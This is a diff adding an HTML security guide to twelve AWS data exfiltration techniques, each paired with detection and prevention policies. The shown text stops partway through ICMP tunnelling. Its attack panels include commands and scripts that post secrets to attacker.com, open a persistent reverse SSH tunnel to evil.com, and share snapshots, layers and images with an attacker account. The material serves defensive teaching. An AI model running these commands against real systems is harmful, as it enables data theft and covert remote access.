@@ -1,0 +1,1307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Exfiltration Techniques - Complete Guide</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #e74c3c 0%, #8e44ad 100%);
+            padding: 20px;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: 40px;
+        }
+        
+        h1 {
+            text-align: center;
+            color: #c53030;
+            font-size: 3rem;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #718096;
+            font-size: 1.2rem;
+            margin-bottom: 40px;
+        }
+        
+        .toc {
+            background: #f7fafc;
+            padding: 30px;
+            border-radius: 12px;
+            margin-bottom: 40px;
+            border-left: 6px solid #e53e3e;
+        }
+        
+        .toc h2 {
+            color: #2d3748;
+            margin-bottom: 20px;
+        }
+        
+        .toc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 15px;
+        }
+        
+        .toc-item {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #fc8181;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .toc-item:hover {
+            background: #fff5f5;
+            transform: translateX(5px);
+        }
+        
+        .section {
+            margin: 60px 0;
+            padding: 40px;
+            background: #f7fafc;
+            border-radius: 16px;
+            border-left: 6px solid #e53e3e;
+        }
+        
+        .section-title {
+            font-size: 2.2rem;
+            color: #2d3748;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: bold;
+        }
+        
+        .badge-critical { background: #fed7d7; color: #c53030; }
+        .badge-high { background: #feebc8; color: #c05621; }
+        .badge-medium { background: #fefcbf; color: #975a16; }
+        
+        .technique-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin: 30px 0;
+        }
+        
+        .technique-box {
+            background: white;
+            border-radius: 12px;
+            padding: 25px;
+            border: 2px solid #e2e8f0;
+        }
+        
+        .technique-box.attack {
+            border-color: #fc8181;
+            background: #fff5f5;
+        }
+        
+        .technique-box.defense {
+            border-color: #68d391;
+            background: #f0fff4;
+        }
+        
+        .box-header {
+            font-size: 1.4rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .flow-step {
+            background: white;
+            border: 2px solid #cbd5e0;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            position: relative;
+        }
+        
+        .flow-step::after {
+            content: "↓";
+            position: absolute;
+            bottom: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 2rem;
+            color: #4a5568;
+        }
+        
+        .flow-step:last-child::after {
+            display: none;
+        }
+        
+        .flow-step.danger {
+            border-color: #fc8181;
+            background: #fff5f5;
+        }
+        
+        .flow-step.success {
+            border-color: #68d391;
+            background: #f0fff4;
+        }
+        
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            overflow-x: auto;
+            margin: 15px 0;
+        }
+        
+        .code-comment {
+            color: #68d391;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            border: 2px solid #e2e8f0;
+        }
+        
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #c53030;
+            margin-bottom: 10px;
+        }
+        
+        .stat-label {
+            color: #4a5568;
+            font-size: 0.95rem;
+        }
+        
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        
+        .comparison-table th {
+            background: #4a5568;
+            color: white;
+            padding: 15px;
+            text-align: left;
+        }
+        
+        .comparison-table td {
+            padding: 12px 15px;
+            border: 1px solid #e2e8f0;
+        }
+        
+        .comparison-table tr:nth-child(even) {
+            background: #f7fafc;
+        }
+        
+        .alert-banner {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 12px;
+            margin: 30px 0;
+        }
+        
+        .detection-methods {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border-left: 4px solid #4299e1;
+        }
+        
+        @media (max-width: 968px) {
+            .technique-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 Data Exfiltration Techniques</h1>
+        <p class="subtitle">Comprehensive Visual Guide to 12 AWS Data Exfiltration Methods</p>
+        
+        <div class="toc">
+            <h2>📋 Table of Contents</h2>
+            <div class="toc-grid">
+                <div class="toc-item">
+                    <strong>1. DNS Tunneling</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Encode data in DNS TXT/CNAME queries</span>
+                </div>
+                <div class="toc-item">
+                    <strong>2. S3 Bucket Sync</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Copy data to attacker-controlled bucket</span>
+                </div>
+                <div class="toc-item">
+                    <strong>3. HTTP/HTTPS Exfiltration</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">POST data to external servers</span>
+                </div>
+                <div class="toc-item">
+                    <strong>4. EBS Snapshot Sharing</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Share encrypted volumes cross-account</span>
+                </div>
+                <div class="toc-item">
+                    <strong>5. RDS Snapshot Export</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Copy database snapshots to attacker account</span>
+                </div>
+                <div class="toc-item">
+                    <strong>6. CloudWatch Logs Streaming</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Stream logs to external destinations</span>
+                </div>
+                <div class="toc-item">
+                    <strong>7. Lambda Layer Exfiltration</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Package data in Lambda layers</span>
+                </div>
+                <div class="toc-item">
+                    <strong>8. ECR Image Push</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Embed secrets in container images</span>
+                </div>
+                <div class="toc-item">
+                    <strong>9. SQS/SNS Message Queues</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Send data via message queues</span>
+                </div>
+                <div class="toc-item">
+                    <strong>10. SSH Tunneling</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Reverse SSH tunnel from EC2</span>
+                </div>
+                <div class="toc-item">
+                    <strong>11. ICMP Tunneling</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Hide data in ping packets</span>
+                </div>
+                <div class="toc-item">
+                    <strong>12. KMS Re-encryption Attack</strong><br/>
+                    <span style="color: #718096; font-size: 0.9rem;">Decrypt & re-encrypt to attacker's CMK</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 1: DNS TUNNELING -->
+        <div class="section">
+            <div class="section-title">
+                1️⃣ DNS Tunneling
+                <span class="badge badge-critical">CRITICAL</span>
+            </div>
+            
+            <p style="font-size: 1.1rem; color: #4a5568; margin-bottom: 20px;">
+                Encode sensitive data in DNS queries (TXT records, CNAME, subdomains). Data is base64-encoded and sent as DNS lookups, 
+                bypassing traditional network monitoring. Each query exfiltrates 63 bytes, can extract 10GB in 48 hours.
+            </p>
+            
+            <div class="technique-grid">
+                <div class="technique-box attack">
+                    <div class="box-header">❌ Attack Flow</div>
+                    <div class="flow-step danger">
+                        <strong>1. Compromise EC2/Lambda</strong><br/>
+                        Attacker gains shell access<br/>
+                        Installs DNS tunneling tool (dnscat2, iodine)
+                    </div>
+                    <div class="flow-step danger">
+                        <strong>2. Encode Data</strong><br/>
+                        Read sensitive files: cat /etc/passwd<br/>
+                        Base64 encode: echo "data" | base64<br/>
+                        Split into 63-byte chunks
+                    </div>
+                    <div class="flow-step danger">
+                        <strong>3. DNS Queries</strong><br/>
+                        dig Y2F0IC9ldGMvcGFzc3dk.attacker.com TXT<br/>
+                        Query attacker's DNS server<br/>
+                        Appears as legitimate DNS lookup
+                    </div>
+                    <div class="flow-step danger">
+                        <strong>4. Data Reconstruction</strong><br/>
+                        Attacker DNS server logs queries<br/>
+                        Decodes base64 subdomains<br/>
+                        Reassembles original data<br/>
+                        ⚠️ 10GB extracted in 48 hours
+                    </div>
+                </div>
+                
+                <div class="technique-box defense">
+                    <div class="box-header">✅ Detection & Prevention</div>
+                    <div class="flow-step success">
+                        <strong>1. Route 53 Resolver DNS Firewall</strong><br/>
+                        Block suspicious TXT record queries<br/>
+                        Alert on long subdomain names (>50 chars)<br/>
+                        Deny queries to non-whitelisted domains
+                    </div>
+                    <div class="flow-step success">
+                        <strong>2. GuardDuty DNS Monitoring</strong><br/>
+                        Detects DGA (Domain Generation Algorithm)<br/>
+                        Alerts on high DNS query volume<br/>
+                        Identifies C2 communication patterns
+                    </div>
+                    <div class="flow-step success">
+                        <strong>3. VPC Flow Logs Analysis</strong><br/>
+                        Monitor DNS traffic volume anomalies<br/>
+                        Track unique destination IPs<br/>
+                        CloudWatch anomaly detection
+                    </div>
+                    <div class="flow-step success">
+                        <strong>4. Network Policies</strong><br/>
+                        Restrict DNS to Route 53 only<br/>
+                        Block external DNS servers (8.8.8.8)<br/>
+                        Use VPC endpoints for AWS services
+                    </div>
+                </div>
+            </div>
+            
+            <div class="code-block">
+<span class="code-comment"># Route 53 Resolver DNS Firewall - Block DNS tunneling</span>
+aws route53resolver create-firewall-rule-group \
+  --name dns-exfiltration-prevention \
+  --creator-request-id $(uuidgen)
+
+aws route53resolver create-firewall-rule \
+  --firewall-rule-group-id rslvr-frg-01234567890abcdef \
+  --firewall-domain-list-id rslvr-fdl-01234567890abcdef \
+  --priority 100 \
+  --action BLOCK \
+  --name block-suspicious-dns
+
+<span class="code-comment"># CloudWatch Anomaly Detection for DNS queries</span>
+aws cloudwatch put-anomaly-detector \
+  --namespace AWS/Route53Resolver \
+  --metric-name DNSQueries \
+  --stat Sum \
+  --dimensions Name=EndpointId,Value=rslvr-in-0123456789abcdef
+
+<span class="code-comment"># GuardDuty - Enable DNS log analysis</span>
+aws guardduty create-detector \
+  --enable \
+  --finding-publishing-frequency FIFTEEN_MINUTES \
+  --data-sources '{"DNSLogs":{"Enable":true}}'
+            </div>
+            
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-number">63</div>
+                    <div class="stat-label">Bytes per DNS query</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">10GB</div>
+                    <div class="stat-label">Extracted in 48 hours</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">95%</div>
+                    <div class="stat-label">Bypass traditional DLP</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 2: S3 BUCKET SYNC -->
+        <div class="section">
+            <div class="section-title">
+                2️⃣ S3 Bucket Sync to Attacker Account
+                <span class="badge badge-critical">CRITICAL</span>
+            </div>
+            
+            <div class="technique-grid">
+                <div class="technique-box attack">
+                    <div class="box-header">❌ Attack Scenario</div>
+                    <div class="flow-step danger">
+                        <strong>Overprivileged IAM Role</strong><br/>
+                        ECS task role has s3:* permissions<br/>
+                        Container compromised via RCE<br/>
+                        Credentials from IMDS: 169.254.169.254
+                    </div>
+                    <div class="flow-step danger">
+                        <strong>Bucket Discovery</strong><br/>
+                        aws s3 ls (list all buckets)<br/>
+                        Find customer-data-prod bucket<br/>
+                        Check for sensitive data: PII, PHI, credit cards
+                    </div>
+                    <div class="flow-step danger">
+                        <strong>Sync to Attacker Bucket</strong><br/>
+                        aws s3 sync s3://customer-data-prod \<br/>
+                        &nbsp;&nbsp;s3://attacker-exfil-bucket --acl public-read<br/>
+                        250GB transferred in 30 minutes<br/>
+                        No alerts triggered
+                    </div>
+                </div>
+                
+                <div class="technique-box defense">
+                    <div class="box-header">✅ Prevention</div>
+                    <div class="flow-step success">
+                        <strong>Least Privilege IAM</strong><br/>
+                        Limit to specific bucket: s3:GetObject<br/>
+                        Restrict actions: only Get, not Put/Delete<br/>
+                        Condition: aws:SourceVpc enforcement
+                    </div>
+                    <div class="flow-step success">
+                        <strong>S3 Block Public Access</strong><br/>
+                        Enable at account/bucket level<br/>
+                        Prevent public ACLs and policies<br/>
+                        Cannot share data publicly
+                    </div>
+                    <div class="flow-step success">
+                        <strong>VPC Endpoints + SCP</strong><br/>
+                        Force S3 access via VPC endpoint<br/>
+                        SCP: Deny PutObject to external buckets<br/>
+                        Whitelist only internal bucket ARNs
+                    </div>
+                </div>
+            </div>
+            
+            <div class="code-block">
+<span class="code-comment"># IAM Policy - Least Privilege S3 access</span>
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Action": ["s3:GetObject", "s3:ListBucket"],
+    "Resource": [
+      "arn:aws:s3:::customer-data-prod",
+      "arn:aws:s3:::customer-data-prod/*"
+    ],
+    "Condition": {
+      "StringEquals": {
+        "aws:SourceVpc": "vpc-12345678"
+      }
+    }
+  }]
+}
+
+<span class="code-comment"># Service Control Policy - Prevent external S3 writes</span>
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Deny",
+    "Action": ["s3:PutObject", "s3:PutObjectAcl"],
+    "Resource": "*",
+    "Condition": {
+      "StringNotEquals": {
+        "s3:ResourceAccount": ["123456789012"]
+      }
+    }
+  }]
+}
+
+<span class="code-comment"># CloudTrail Alert - S3 sync to external bucket</span>
+aws cloudwatch put-metric-alarm \
+  --alarm-name s3-exfiltration-alert \
+  --metric-name S3OutboundBytes \
+  --threshold 10000000000 \
+  --comparison-operator GreaterThanThreshold
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 3: HTTP/HTTPS EXFILTRATION -->
+        <div class="section">
+            <div class="section-title">
+                3️⃣ HTTP/HTTPS POST to External Server
+                <span class="badge badge-high">HIGH</span>
+            </div>
+            
+            <div class="technique-grid">
+                <div class="technique-box attack">
+                    <div class="box-header">❌ Simple & Effective</div>
+                    <div class="code-block">
+<span class="code-comment"># From compromised Lambda/EC2</span>
+curl -X POST https://attacker.com/exfil \
+  -H "Content-Type: application/json" \
+  -d "$(cat /tmp/secrets.json)"
+
+<span class="code-comment"># Python exfiltration script</span>
+import requests
+import boto3
+
+s3 = boto3.client('s3')
+obj = s3.get_object(Bucket='prod-data', Key='customers.csv')
+data = obj['Body'].read()
+
+requests.post('https://attacker.com/upload', 
+              files={'data': data})
+                    </div>
+                </div>
+                
+                <div class="technique-box defense">
+                    <div class="box-header">✅ Detection</div>
+                    <div class="detection-methods">
+                        <strong>1. VPC Flow Logs</strong>
+                        <ul style="margin-top: 10px; padding-left: 20px;">
+                            <li>Monitor outbound connections to unknown IPs</li>
+                            <li>Alert on high data transfer volumes</li>
+                            <li>Identify connections outside business hours</li>
+                        </ul>
+                        
+                        <strong style="display: block; margin-top: 15px;">2. AWS Network Firewall</strong>
+                        <ul style="margin-top: 10px; padding-left: 20px;">
+                            <li>Stateful rules to block POST to external domains</li>
+                            <li>Allow-list approved external APIs only</li>
+                            <li>TLS inspection for HTTPS traffic</li>
+                        </ul>
+                        
+                        <strong style="display: block; margin-top: 15px;">3. GuardDuty Runtime Monitoring</strong>
+                        <ul style="margin-top: 10px; padding-left: 20px;">
+                            <li>Detects unusual network activity from Lambda/ECS</li>
+                            <li>Identifies connections to known malicious IPs</li>
+                            <li>Alerts on sudden traffic spikes</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 4: EBS SNAPSHOT SHARING -->
+        <div class="section">
+            <div class="section-title">
+                4️⃣ EBS Snapshot Sharing Cross-Account
+                <span class="badge badge-critical">CRITICAL</span>
+            </div>
+            
+            <div class="technique-grid">
+                <div class="technique-box attack">
+                    <div class="box-header">❌ Volume Theft</div>
+                    <div class="flow-step danger">
+                        <strong>Create Snapshot</strong><br/>
+                        aws ec2 create-snapshot \<br/>
+                        &nbsp;&nbsp;--volume-id vol-production-db<br/>
+                        Snapshot contains entire database
+                    </div>
+                    <div class="flow-step danger">
+                        <strong>Share with Attacker Account</strong><br/>
+                        aws ec2 modify-snapshot-attribute \<br/>
+                        &nbsp;&nbsp;--snapshot-id snap-0123 \<br/>
+                        &nbsp;&nbsp;--attribute createVolumePermission \<br/>
+                        &nbsp;&nbsp;--user-ids 999888777666<br/>
+                        Attacker can now access data
+                    </div>
+                    <div class="flow-step danger">
+                        <strong>Attacker Copies Snapshot</strong><br/>
+                        In attacker account (999888777666):<br/>
+                        aws ec2 copy-snapshot --source-snapshot snap-0123<br/>
+                        Create volume, mount, extract data<br/>
+                        Complete database stolen
+                    </div>
+                </div>
+                
+                <div class="technique-box defense">
+                    <div class="box-header">✅ Prevention</div>
+                    <div class="flow-step success">
+                        <strong>EBS Encryption Enforcement</strong><br/>
+                        Enable EBS encryption by default<br/>
+                        CMK policy restricts decrypt to your account only<br/>
+                        Shared snapshots remain encrypted
+                    </div>
+                    <div class="flow-step success">
+                        <strong>IAM Restrictions</strong><br/>
+                        Deny ModifySnapshotAttribute action<br/>
+                        Only allow specific admin role<br/>
+                        Require MFA for snapshot operations
+                    </div>
+                    <div class="flow-step success">
+                        <strong>CloudTrail Monitoring</strong><br/>
+                        Alert on ModifySnapshotAttribute calls<br/>
+                        Detect cross-account sharing attempts<br/>
+                        Automated remediation via Lambda
+                    </div>
+                </div>
+            </div>
+            
+            <div class="code-block">
+<span class="code-comment"># SCP - Prevent EBS snapshot sharing</span>
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Deny",
+    "Action": ["ec2:ModifySnapshotAttribute"],
+    "Resource": "*",
+    "Condition": {
+      "Bool": {
+        "ec2:Add/userId": "true"
+      }
+    }
+  }]
+}
+
+<span class="code-comment"># EventBridge rule - Alert on snapshot sharing</span>
+{
+  "source": ["aws.ec2"],
+  "detail-type": ["AWS API Call via CloudTrail"],
+  "detail": {
+    "eventName": ["ModifySnapshotAttribute"],
+    "requestParameters": {
+      "attributeType": ["createVolumePermission"]
+    }
+  }
+}
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 5: RDS SNAPSHOT EXPORT -->
+        <div class="section">
+            <div class="section-title">
+                5️⃣ RDS Snapshot Export to S3
+                <span class="badge badge-critical">CRITICAL</span>
+            </div>
+            
+            <p style="font-size: 1.1rem; color: #4a5568; margin-bottom: 20px;">
+                Export RDS snapshot to S3, then sync to attacker bucket. Entire production database (500GB) exfiltrated. 
+                Works even with encrypted RDS - snapshot decrypted during export if attacker has KMS permissions.
+            </p>
+            
+            <div class="code-block">
+<span class="code-comment"># Attack: Export RDS snapshot to S3</span>
+aws rds start-export-task \
+  --export-task-identifier prod-db-export \
+  --source-arn arn:aws:rds:us-east-1:123456789012:snapshot:prod-db-snapshot \
+  --s3-bucket-name temp-export-bucket \
+  --iam-role-arn arn:aws:iam::123456789012:role/rds-export-role \
+  --kms-key-id arn:aws:kms:us-east-1:123456789012:key/...
+
+<span class="code-comment"># Then sync to attacker bucket</span>
+aws s3 sync s3://temp-export-bucket s3://attacker-bucket
+
+<span class="code-comment"># PREVENTION: Deny RDS export action via SCP</span>
+{
+  "Effect": "Deny",
+  "Action": ["rds:StartExportTask"],
+  "Resource": "*"
+}
+
+<span class="code-comment"># Alternative: Restrict to specific buckets only</span>
+{
+  "Effect": "Deny",
+  "Action": ["rds:StartExportTask"],
+  "Resource": "*",
+  "Condition": {
+    "StringNotEquals": {
+      "rds:ExportDestinationBucket": ["arn:aws:s3:::approved-backup-bucket"]
+    }
+  }
+}
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 6: CLOUDWATCH LOGS STREAMING -->
+        <div class="section">
+            <div class="section-title">
+                6️⃣ CloudWatch Logs Streaming to External
+                <span class="badge badge-high">HIGH</span>
+            </div>
+            
+            <div class="technique-grid">
+                <div class="technique-box attack">
+                    <div class="box-header">❌ Log Exfiltration</div>
+                    <p style="margin-bottom: 15px;">
+                        Application logs contain sensitive data: API keys, customer PII, internal URLs. 
+                        Attacker creates subscription filter to stream logs to their Kinesis stream or Lambda.
+                    </p>
+                    <div class="code-block" style="margin-top: 0;">
+<span class="code-comment"># Create subscription filter to attacker Lambda</span>
+aws logs put-subscription-filter \
+  --log-group-name /aws/lambda/payment-processor \
+  --filter-name exfil \
+  --filter-pattern "" \
+  --destination-arn arn:aws:lambda:us-east-1:999888777666:function:steal-logs
+                    </div>
+                </div>
+                
+                <div class="technique-box defense">
+                    <div class="box-header">✅ Protection</div>
+                    <div class="code-block" style="margin-top: 0;">
+<span class="code-comment"># SCP - Deny cross-account log destinations</span>
+{
+  "Effect": "Deny",
+  "Action": ["logs:PutSubscriptionFilter"],
+  "Resource": "*",
+  "Condition": {
+    "StringNotEquals": {
+      "logs:DestinationAccount": ["123456789012"]
+    }
+  }
+}
+
+<span class="code-comment"># Data Masking - Scrub sensitive data from logs</span>
+import re
+
+def mask_pii(log_data):
+    # Mask credit cards
+    log_data = re.sub(r'\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}', 
+                      'XXXX-XXXX-XXXX-XXXX', log_data)
+    # Mask emails
+    log_data = re.sub(r'[\w\.-]+@[\w\.-]+', 
+                      'user@REDACTED.com', log_data)
+    return log_data
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 7: LAMBDA LAYER -->
+        <div class="section">
+            <div class="section-title">
+                7️⃣ Lambda Layer Data Packaging
+                <span class="badge badge-medium">MEDIUM</span>
+            </div>
+            
+            <p style="font-size: 1.1rem; color: #4a5568; margin-bottom: 20px;">
+                Package stolen data as Lambda layer (250MB limit), publish layer, download from attacker account. 
+                Bypasses network monitoring since it uses AWS APIs, not external connections.
+            </p>
+            
+            <div class="code-block">
+<span class="code-comment"># Attacker script running in compromised Lambda</span>
+import boto3
+import zipfile
+
+<span class="code-comment"># 1. Collect sensitive data</span>
+s3 = boto3.client('s3')
+obj = s3.get_object(Bucket='secrets', Key='api-keys.json')
+data = obj['Body'].read()
+
+<span class="code-comment"># 2. Create zip file (Lambda layer format)</span>
+with zipfile.ZipFile('/tmp/layer.zip', 'w') as z:
+    z.writestr('data.json', data)
+
+<span class="code-comment"># 3. Publish as Lambda layer</span>
+lambda_client = boto3.client('lambda')
+with open('/tmp/layer.zip', 'rb') as f:
+    layer_response = lambda_client.publish_layer_version(
+        LayerName='exfil-layer',
+        Content={'ZipFile': f.read()},
+        CompatibleRuntimes=['python3.9']
+    )
+
+<span class="code-comment"># 4. Grant attacker account access</span>
+lambda_client.add_layer_version_permission(
+    LayerName='exfil-layer',
+    VersionNumber=1,
+    StatementId='allow-attacker',
+    Action='lambda:GetLayerVersion',
+    Principal='999888777666'
+)
+
+<span class="code-comment"># 5. From attacker account - download layer</span>
+aws lambda get-layer-version --layer-name exfil-layer --version-number 1
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 8: ECR IMAGE PUSH -->
+        <div class="section">
+            <div class="section-title">
+                8️⃣ Container Image Push with Embedded Data
+                <span class="badge badge-high">HIGH</span>
+            </div>
+            
+            <div class="technique-grid">
+                <div class="technique-box attack">
+                    <div class="box-header">❌ Image Smuggling</div>
+                    <div class="code-block" style="margin-top: 0;">
+<span class="code-comment"># From compromised build pipeline or EC2</span>
+<span class="code-comment"># 1. Create Dockerfile with stolen data</span>
+cat > Dockerfile << 'EOF'
+FROM alpine:latest
+COPY /tmp/stolen-db-dump.sql /data/
+EOF
+
+<span class="code-comment"># 2. Build image</span>
+docker build -t 123456789012.dkr.ecr.us-east-1.amazonaws.com/legitimate-app:v2 .
+
+<span class="code-comment"># 3. Push to ECR</span>
+docker push 123456789012.dkr.ecr.us-east-1.amazonaws.com/legitimate-app:v2
+
+<span class="code-comment"># 4. Share ECR repository with attacker account</span>
+aws ecr set-repository-policy --repository-name legitimate-app \
+  --policy-text '{
+    "Statement": [{
+      "Effect": "Allow",
+      "Principal": {"AWS": "arn:aws:iam::999888777666:root"},
+      "Action": ["ecr:GetDownloadUrlForLayer", "ecr:BatchGetImage"]
+    }]
+  }'
+
+<span class="code-comment"># 5. Attacker pulls image, extracts data</span>
+docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/legitimate-app:v2
+docker run --rm legitimate-app:v2 cat /data/stolen-db-dump.sql > recovered.sql
+                    </div>
+                </div>
+                
+                <div class="technique-box defense">
+                    <div class="box-header">✅ Prevention</div>
+                    <div class="code-block" style="margin-top: 0;">
+<span class="code-comment"># ECR Repository Policy - Block cross-account access</span>
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Sid": "DenyExternalAccess",
+    "Effect": "Deny",
+    "Principal": "*",
+    "Action": ["ecr:*"],
+    "Condition": {
+      "StringNotEquals": {
+        "aws:PrincipalAccount": "123456789012"
+      }
+    }
+  }]
+}
+
+<span class="code-comment"># Image scan for sensitive data patterns</span>
+<span class="code-comment"># Use ECR Enhanced Scanning + custom rules</span>
+aws ecr put-image-scanning-configuration \
+  --repository-name legitimate-app \
+  --image-scanning-configuration scanOnPush=true
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 9: SQS/SNS QUEUES -->
+        <div class="section">
+            <div class="section-title">
+                9️⃣ Message Queue Exfiltration (SQS/SNS)
+                <span class="badge badge-medium">MEDIUM</span>
+            </div>
+            
+            <div class="code-block">
+<span class="code-comment"># Send data via SQS to attacker-accessible queue</span>
+import boto3
+import json
+
+sqs = boto3.client('sqs')
+
+<span class="code-comment"># Read sensitive data</span>
+with open('/tmp/customer-records.json') as f:
+    data = json.load(f)
+
+<span class="code-comment"># Send to SQS queue (in chunks, 256KB per message)</span>
+for record in data:
+    sqs.send_message(
+        QueueUrl='https://sqs.us-east-1.amazonaws.com/999888777666/exfil-queue',
+        MessageBody=json.dumps(record)
+    )
+
+<span class="code-comment"># OR via SNS to attacker's endpoint</span>
+sns = boto3.client('sns')
+sns.publish(
+    TopicArn='arn:aws:sns:us-east-1:999888777666:exfil-topic',
+    Message=json.dumps(data)
+)
+
+<span class="code-comment"># PREVENTION: Restrict SQS/SNS to same account</span>
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Deny",
+    "Action": ["sqs:SendMessage", "sns:Publish"],
+    "Resource": "*",
+    "Condition": {
+      "StringNotEquals": {
+        "aws:ResourceAccount": "123456789012"
+      }
+    }
+  }]
+}
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 10: SSH TUNNELING -->
+        <div class="section">
+            <div class="section-title">
+                🔟 SSH Reverse Tunnel from EC2
+                <span class="badge badge-high">HIGH</span>
+            </div>
+            
+            <div class="technique-grid">
+                <div class="technique-box attack">
+                    <div class="box-header">❌ Persistent Tunnel</div>
+                    <div class="code-block" style="margin-top: 0;">
+<span class="code-comment"># From compromised EC2 instance</span>
+<span class="code-comment"># Create reverse SSH tunnel to attacker server</span>
+ssh -f -N -R 8080:localhost:22 attacker@evil.com
+
+<span class="code-comment"># Now attacker can SSH into EC2 via tunnel</span>
+<span class="code-comment"># On attacker server:</span>
+ssh -p 8080 ubuntu@localhost
+
+<span class="code-comment"># Transfer data through tunnel</span>
+scp -P 8080 ubuntu@localhost:/tmp/database-dump.sql ./
+
+<span class="code-comment"># Persistent tunnel (survives reboot)</span>
+cat > /etc/systemd/system/tunnel.service << 'EOF'
+[Unit]
+Description=SSH Reverse Tunnel
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/ssh -N -R 8080:localhost:22 attacker@evil.com
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable tunnel.service
+                    </div>
+                </div>
+                
+                <div class="technique-box defense">
+                    <div class="box-header">✅ Detection</div>
+                    <div class="detection-methods">
+                        <strong>1. VPC Flow Logs</strong>
+                        <ul style="margin-top: 10px; padding-left: 20px;">
+                            <li>Monitor outbound SSH (port 22) connections</li>
+                            <li>Alert on long-lived connections (>1 hour)</li>
+                            <li>Identify connections to unknown IPs</li>
+                        </ul>
+                        
+                        <strong style="display: block; margin-top: 15px;">2. Security Group Restrictions</strong>
+                        <ul style="margin-top: 10px; padding-left: 20px;">
+                            <li>Deny all outbound SSH except to bastion</li>
+                            <li>Use Systems Manager Session Manager instead</li>
+                            <li>No SSH keys on production instances</li>
+                        </ul>
+                        
+                        <strong style="display: block; margin-top: 15px;">3. GuardDuty</strong>
+                        <ul style="margin-top: 10px; padding-left: 20px;">
+                            <li>UnauthorizedAccess:EC2/SSHBruteForce</li>
+                            <li>Backdoor:EC2/C&CActivity.B!DNS</li>
+                            <li>Exfiltration:EC2/DataExfiltration</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 11: ICMP TUNNELING -->
+        <div class="section">
+            <div class="section-title">
+                1️⃣1️⃣ ICMP Tunneling (Ping Exfiltration)
+                <span class="badge badge-medium">MEDIUM</span>
+            </div>
+            
+            <p style="font-size: 1.1rem; color: #4a5568; margin-bottom: 20px;">
+                Embed data in ICMP echo request payloads. Each ping packet carries 48-56 bytes of data. 
+                Bypasses most firewall rules since ICMP is usually allowed. Hard to detect without deep packet inspection.
+            </p>
+            
+            <div class="code-block">
+<span class="code-comment"># Encode data in ping packets</span>
+import subprocess
+import base64
+
